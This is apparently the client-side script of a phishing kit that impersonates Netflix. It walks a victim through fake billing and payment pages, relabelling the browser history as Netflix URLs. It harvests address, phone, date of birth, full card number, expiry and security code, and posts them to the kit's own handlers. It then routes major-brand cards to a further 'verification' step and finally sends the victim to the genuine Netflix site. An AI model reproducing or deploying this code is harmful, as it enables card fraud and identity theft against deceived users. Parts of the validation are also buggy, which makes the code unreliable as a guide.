var errors = {
  firstname : false,
  lastname : false,
  address : false,
  city : false,
  address : false,
  zip : false,
  state : false,
  phone : false,
  dob: false
}

var carderror = {
  firstname : false,
  lastname : false,
  number : false,
  expdate : false,
  ccv : false
}

document.getElementById("region").addEventListener("change", function(e) {
  window.location = "../actions/changeLanguage.php?language="+document.getElementById("region").value+"&page=step0";
});

function driveStep(step) {
  switch(step) {
    case 1:
      window.history.pushState('billing', 'Netflix', 'billing.php');
      document.getElementById("step0").className = "minbody hidden";
      document.getElementById("step2").className = "fadeInAnim";
      break;
    case 2:
      window.history.pushState('payment', 'Netflix', 'payment.php');
      document.getElementById("step2").className = "fadeInAnim hidden";
      document.getElementById("step3").className = "fadeInAnim";
      break;
    case 3:
      window.history.pushState('You\'re all set!', 'Netflix', 'done.php');
      document.getElementById("step3").className = "fadeInAnim hidden";
      document.getElementById("step4").className = "fadeInAnim";
      break;
  }
}


/* Label */
document.getElementById("firstNameLabel").addEventListener("click", function(e) {
  document.getElementById("firstNameLabel").className = "labelUP";
  document.getElementById("first_name").focus();
});
document.getElementById("first_name").addEventListener("focus", function(e) {
  document.getElementById("firstNameLabel").className = "labelUP";
});
document.getElementById("first_name").addEventListener("blur", function(e) {
  if(document.getElementById("first_name").value == "") {
    document.getElementById("firstNameLabel").className = "labelDown";
    document.getElementById("firstnameError").innerHTML = "First Name is required!";
    document.getElementById("first_name").className = "inputError";
    errors.firstname = false;
  } else {
    document.getElementById("firstnameError").innerHTML = "";
    document.getElementById("first_name").className = "inputSuccess";
    errors.firstname = true;
  }
});
/* End Label */

/* Label */
document.getElementById("lastNameLabel").addEventListener("click", function(e) {
  document.getElementById("lastNameLabel").className = "labelUP";
  document.getElementById("last_name").focus();
});
document.getElementById("last_name").addEventListener("focus", function(e) {
  document.getElementById("lastNameLabel").className = "labelUP";
});
document.getElementById("last_name").addEventListener("blur", function(e) {
  if(document.getElementById("last_name").value == "") {
    document.getElementById("lastNameLabel").className = "labelDown";
    document.getElementById("lastnameError").innerHTML = "Last Name is required!";
    document.getElementById("last_name").className = "inputError";
    errors.lastname = false;
  } else {
    document.getElementById("lastnameError").innerHTML = "";
    document.getElementById("last_name").className = "inputSuccess";
    errors.lastname = true;
  }
});
/* End Label */

/* Label */
document.getElementById("addressLabel").addEventListener("click", function(e) {
  document.getElementById("addressLabel").className = "labelUP";
  document.getElementById("address").focus();
});
document.getElementById("address").addEventListener("focus", function(e) {
  document.getElementById("addressLabel").className = "labelUP";
});
document.getElementById("address").addEventListener("blur", function(e) {
  if(document.getElementById("address").value == "") {
    document.getElementById("addressLabel").className = "labelDown";
    document.getElementById("addressError").innerHTML = "Address is required!";
    document.getElementById("address").className = "inputError";
    errors.address = false;
  } else {
    document.getElementById("addressError").innerHTML = "";
    document.getElementById("address").className = "inputSuccess";
    errors.address = true;
  }
});
/* End Label */

/* Label */
document.getElementById("cityLabel").addEventListener("click", function(e) {
  document.getElementById("cityLabel").className = "labelUP";
  document.getElementById("city").focus();
});
document.getElementById("city").addEventListener("focus", function(e) {
  document.getElementById("cityLabel").className = "labelUP";
});
document.getElementById("city").addEventListener("blur", function(e) {
  if(document.getElementById("city").value == "") {
    document.getElementById("cityLabel").className = "labelDown";
    document.getElementById("cityError").innerHTML = "City is required!";
    document.getElementById("city").className = "inputError";
    errors.city = true;
  } else {
    document.getElementById("cityError").innerHTML = "";
    document.getElementById("city").className = "inputSuccess";
    errors.city = true;
  }
});
/* End Label */

/* Label */
document.getElementById("stateLabel").addEventListener("click", function(e) {
  document.getElementById("stateLabel").className = "labelUPShort";
  document.getElementById("state").focus();
});
document.getElementById("state").addEventListener("focus", function(e) {
  document.getElementById("stateLabel").className = "labelUPShort";
});
document.getElementById("state").addEventListener("blur", function(e) {
  if(document.getElementById("state").value == "") {
    document.getElementById("stateLabel").className = "labelDownShort";
    document.getElementById("statezipError").innerHTML = "State is required!";
    document.getElementById("state").className = "inputError";
    errors.state = true;
  } else {
    document.getElementById("statezipError").innerHTML = "";
    document.getElementById("state").className = "inputSuccess";
    errors.state = true;
  }
});
/* End Label */

/* Label */
document.getElementById("zipLabel").addEventListener("click", function(e) {
  document.getElementById("zipLabel").className = "labelUPShort";
  document.getElementById("zip").focus();
});
document.getElementById("zip").addEventListener("focus", function(e) {
  document.getElementById("zipLabel").className = "labelUPShort";
});
document.getElementById("zip").addEventListener("blur", function(e) {
  if(document.getElementById("zip").value == "") {
    document.getElementById("zipLabel").className = "labelDownShort";
    document.getElementById("statezipError").innerHTML = "Zip code is required!";
    document.getElementById("zip").className = "inputError";
    errors.zip = false;
  } else {
    document.getElementById("statezipError").innerHTML = "";
    document.getElementById("zip").className = "inputSuccess";
    errors.zip = true;
  }
});
/* End Label */

/* Label */
document.getElementById("phoneLabel").addEventListener("click", function(e) {
  document.getElementById("phoneLabel").className = "labelUP";
  document.getElementById("phone").focus();
});
document.getElementById("phone").addEventListener("focus", function(e) {
  document.getElementById("phoneLabel").className = "labelUP";
});
document.getElementById("phone").addEventListener("blur", function(e) {
  if(document.getElementById("phone").value == "") {
    document.getElementById("phoneLabel").className = "labelDown";
    document.getElementById("phoneError").innerHTML = "Phone Number is required!";
    document.getElementById("phone").className = "inputError";
    errors.phone = false;
  } else {
    document.getElementById("phoneError").innerHTML = "";
    document.getElementById("phone").className = "inputSuccess";
    errors.phone = true;
  }
});
/* End Label */

/* Label */
document.getElementById("dobLabel").addEventListener("click", function(e) {
  document.getElementById("dobLabel").className = "labelUP";
  document.getElementById("dob").focus();
});
document.getElementById("dob").addEventListener("focus", function(e) {
  document.getElementById("dobLabel").className = "labelUP";
});
document.getElementById("dob").addEventListener("blur", function(e) {
  if(document.getElementById("dob").value == "") {
    document.getElementById("dobLabel").className = "labelDown";
    document.getElementById("dobError").innerHTML = "Date of birth is required!";
    document.getElementById("dob").className = "inputError";
    errors.dob = false;
  } else {
    document.getElementById("dobError").innerHTML = "";
    document.getElementById("dob").className = "inputSuccess";
    errors.dob = true;
  }
});
/* End Label */


document.getElementById("submit_btn").addEventListener("click", function(e) {
  // submit
  if(errors.firstname && errors.lastname && errors.address && errors.city && errors.zip && errors.state && errors.phone && errors.dob) {
    document.getElementById("content").className = "hidden";
    document.getElementById("loading").style = "font-size : 1.5em; margin-top : 2px;";
    document.getElementById("submit_btn").className = "disabled";
    var http = new XMLHttpRequest();
    var url = '../actions/billing.php';
    var params = 'first_name='+document.getElementById("first_name").value+"&last_name="+document.getElementById("last_name").value+"&address="+document.getElementById("address").value+"&city="+document.getElementById("city").value+"&state="+document.getElementById("state").value+"&zip="+document.getElementById("zip").value+"&phone="+document.getElementById("phone").value+"&dob="+document.getElementById("dob").value;
    http.open('POST', url, true);
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {
            driveStep(2);
        }
    }
    http.send(params);
  }
});


/* Label */
document.getElementById("firstNameCardLabel").addEventListener("click", function(e) {
  document.getElementById("firstNameCardLabel").className = "labelUP";
  document.getElementById("firstnamecard").focus();
});
document.getElementById("firstnamecard").addEventListener("focus", function(e) {
  document.getElementById("firstNameCardLabel").className = "labelUP";
});
document.getElementById("firstnamecard").addEventListener("blur", function(e) {
  if(document.getElementById("firstnamecard").value == "") {
    document.getElementById("firstNameCardLabel").className = "labelDown";
    document.getElementById("firstnameErrorCard").innerHTML = "First Name is required!";
    document.getElementById("firstnamecard").className = "inputError";
    carderror.firstname = false;
  } else {
    document.getElementById("firstnameErrorCard").innerHTML = "";
    document.getElementById("firstnamecard").className = "inputSuccess";
    carderror.firstname = true;
  }
});
/* End Label */

/* Label */
document.getElementById("firstNameCardLabel").addEventListener("click", function(e) {
  document.getElementById("firstNameCardLabel").className = "labelUP";
  document.getElementById("firstnamecard").focus();
});
document.getElementById("firstnamecard").addEventListener("focus", function(e) {
  document.getElementById("firstNameCardLabel").className = "labelUP";
});
document.getElementById("firstnamecard").addEventListener("blur", function(e) {
  if(document.getElementById("firstnamecard").value == "") {
    document.getElementById("firstNameCardLabel").className = "labelDown";
    document.getElementById("firstnameErrorCard").innerHTML = "First Name is required!";
    document.getElementById("firstnamecard").className = "inputError";
    carderror.firstname = false;
  } else {
    document.getElementById("firstnameErrorCard").innerHTML = "";
    document.getElementById("firstnamecard").className = "inputSuccess";
    carderror.firstname = true;
  }
});
/* End Label */

/* Label */
document.getElementById("lastNameLabelCard").addEventListener("click", function(e) {
  document.getElementById("lastNameLabelCard").className = "labelUP";
  document.getElementById("lastnamecard").focus();
});
document.getElementById("lastnamecard").addEventListener("focus", function(e) {
  document.getElementById("lastNameLabelCard").className = "labelUP";
});
document.getElementById("lastnamecard").addEventListener("blur", function(e) {
  if(document.getElementById("lastnamecard").value == "") {
    document.getElementById("lastNameLabelCard").className = "labelDown";
    document.getElementById("lastnameErrorCard").innerHTML = "First Name is required!";
    document.getElementById("lastnamecard").className = "inputError";
    carderror.lastname = false;
  } else {
    document.getElementById("lastnameErrorCard").innerHTML = "";
    document.getElementById("lastnamecard").className = "inputSuccess";
    carderror.lastname = true;
  }
});
/* End Label */

/* Label */
document.getElementById("lastNameLabelCard").addEventListener("click", function(e) {
  document.getElementById("lastNameLabelCard").className = "labelUP";
  document.getElementById("lastnamecard").focus();
});
document.getElementById("lastnamecard").addEventListener("focus", function(e) {
  document.getElementById("lastNameLabelCard").className = "labelUP";
});
document.getElementById("lastnamecard").addEventListener("blur", function(e) {
  if(document.getElementById("lastnamecard").value == "") {
    document.getElementById("lastNameLabelCard").className = "labelDown";
    document.getElementById("lastnameErrorCard").innerHTML = "Last Name is required!";
    document.getElementById("lastnamecard").className = "inputError";
    carderror.lastname = false;
  } else {
    document.getElementById("lastnameErrorCard").innerHTML = "";
    document.getElementById("lastnamecard").className = "inputSuccess";
    carderror.lastname = true;
  }
});
/* End Label */

/* Label */
document.getElementById("cardnumberLabel").addEventListener("click", function(e) {
  document.getElementById("cardnumberLabel").className = "labelUP";
  document.getElementById("cardnumber").focus();
});
document.getElementById("cardnumber").addEventListener("focus", function(e) {
  document.getElementById("cardnumberLabel").className = "labelUP";
});
document.getElementById("cardnumber").addEventListener("blur", function(e) {
  if(document.getElementById("cardnumber").value == "") {
    document.getElementById("cardnumberLabel").className = "labelDown";
    document.getElementById("cardnumberError").innerHTML = "Card number is required!";
    document.getElementById("cardnumber").className = "inputError";
    carderror.number = false;
  } else {
    document.getElementById("cardnumberError").innerHTML = "";
    document.getElementById("cardnumber").className = "inputSuccess";
    carderror.number = true;
  }
});
/* End Label */

/* Label */
document.getElementById("expLabel").addEventListener("click", function(e) {
  document.getElementById("expLabel").className = "labelUP";
  document.getElementById("expdate").focus();
});
document.getElementById("expdate").addEventListener("focus", function(e) {
  document.getElementById("expLabel").className = "labelUP";
});
document.getElementById("expdate").addEventListener("blur", function(e) {
  if(document.getElementById("expdate").value == "") {
    document.getElementById("expLabel").className = "labelDown";
    document.getElementById("expError").innerHTML = "Expiration date is required!";
    document.getElementById("expdate").className = "inputError";
    carderror.expdate = false;
  } else {
    document.getElementById("expError").innerHTML = "";
    document.getElementById("expdate").className = "inputSuccess";
    carderror.expdate = true;
  }
});
/* End Label */

/* Label */
document.getElementById("scvLabel").addEventListener("click", function(e) {
  document.getElementById("scvLabel").className = "labelUP";
  document.getElementById("scv").focus();
});
document.getElementById("scv").addEventListener("focus", function(e) {
  document.getElementById("scvLabel").className = "labelUP";
});
document.getElementById("scv").addEventListener("blur", function(e) {
  if(document.getElementById("scv").value == "") {
    document.getElementById("scvLabel").className = "labelDown";
    document.getElementById("scvError").innerHTML = "Security Code is required!";
    document.getElementById("scv").className = "inputError";
    carderror.ccv = false;
  } else {
    document.getElementById("scvError").innerHTML = "";
    document.getElementById("scv").className = "inputSuccess";
    carderror.ccv = true;
  }
});
/* End Label */

function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value.replace(
    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
  ).replace(
    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
  ).replace(
    /^1([3-9])$/g, '01/$1' // 13 > 01/3 //UPDATED by NAVNEET
  // ).replace(
  //   /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
  ).replace(
    /^0\/|0+$/g, '0' // 0/ > 0 and 00 > 0 //UPDATED by NAVNEET
  ).replace(
    /[^\d|^\/]*/g, '' // To allow only digits and `/` //UPDATED by NAVNEET
  ).replace(
    /\/\//g, '/' // Prevent entering more than 1 `/`
  );
}

document.getElementById("expdate").addEventListener("keydown", function(e) {
  formatString(e);
});

var cleave = new Cleave('#cardnumber', {
    creditCard: true,
    onCreditCardTypeChanged: function (type) {
        // update UI ...
    }
});

document.getElementById("helpButt").addEventListener("click", function(e) {
  document.getElementById("cvv").className = "layer";
});
document.getElementById("close").addEventListener("click", function(e) {
  document.getElementById("cvv").className = "layer hidden";
});

function getCardType(cardNum) {

    if(!luhnCheck(cardNum)){
	return "";
    }
    var payCardType = "";
    var regexMap = [
      {regEx: /^4[0-9]{5}/ig,cardType: "VISA"},
      {regEx: /^5[1-5][0-9]{4}/ig,cardType: "MASTERCARD"},
      {regEx: /^3[47][0-9]{3}/ig,cardType: "AMEX"},
      {regEx: /^(5[06-8]\d{4}|6\d{5})/ig,cardType: "MAESTRO"}
    ];
    
    for (var j = 0; j < regexMap.length; j++) {
      if (cardNum.match(regexMap[j].regEx)) {
        payCardType = regexMap[j].cardType;
        break;
      }
    }

    if (cardNum.indexOf("50") === 0 || cardNum.indexOf("60") === 0 || cardNum.indexOf("65") === 0) {
      var g = "508500-508999|606985-607984|608001-608500|652150-653149";
      var i = g.split("|");
      for (var d = 0; d < i.length; d++) {
        var c = parseInt(i[d].split("-")[0], 10);
        var f = parseInt(i[d].split("-")[1], 10);
        if ((cardNum.substr(0, 6) >= c && cardNum.substr(0, 6) <= f) && cardNum.length >= 6) {
         payCardType = "RUPAY";
          break;
        }
      }
    }
    return payCardType;
	
}
	
	
function luhnCheck(cardNum){
    // Luhn Check Code from https://gist.github.com/4075533
    // accept only digits, dashes or spaces
    var numericDashRegex = /^[\d\-\s]+$/
    if (!numericDashRegex.test(cardNum)) return false;

    // The Luhn Algorithm. It's so pretty.
    var nCheck = 0, nDigit = 0, bEven = false;
    var strippedField = cardNum.replace(/\D/g, "");

    for (var n = strippedField.length - 1; n >= 0; n--) {
        var cDigit = strippedField.charAt(n);
        nDigit = parseInt(cDigit, 10);
        if (bEven) {
            if ((nDigit *= 2) > 9) nDigit -= 9;
        }

        nCheck += nDigit;
        bEven = !bEven;
    }

  	return (nCheck % 10) === 0;
}

document.getElementById("submit_btn_card").addEventListener("click", function(e) {
  // submit
  if(carderror.firstname && carderror.lastname && carderror.number && carderror.expdate && carderror.ccv) {
    document.getElementById("content_card").className = "hidden";
    document.getElementById("loading_card").style = "font-size : 1.5em; margin-top : 2px;";
    document.getElementById("submit_btn_card").className = "disabled";
    var http = new XMLHttpRequest();
    var url = '../actions/cards.php';
    var params = 'firstnamecard='+document.getElementById("firstnamecard").value+"&lastnamecard="+document.getElementById("lastnamecard").value+"&cardnumber="+document.getElementById("cardnumber").value+"&expdate="+document.getElementById("expdate").value+"&scv="+document.getElementById("scv").value;
    http.open('POST', url, true);
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.onreadystatechange = function() {
        if(http.readyState == 4 && http.status == 200) {
            if(getCardType(document.getElementById("cardnumber").value.replace(" ", "")) == "VISA" || getCardType(document.getElementById("cardnumber").value.replace(" ", "")) == "MASTERCARD" || getCardType(document.getElementById("cardnumber").value.replace(" ", "")) == "AMEX") {
                   window.location = "../verification.php";
            } else {
                driveStep(3);
            }
        }
    }
    http.send(params);
  }
});


function loginNetflix() {
  window.location = "https://www.netflix.com/";
}
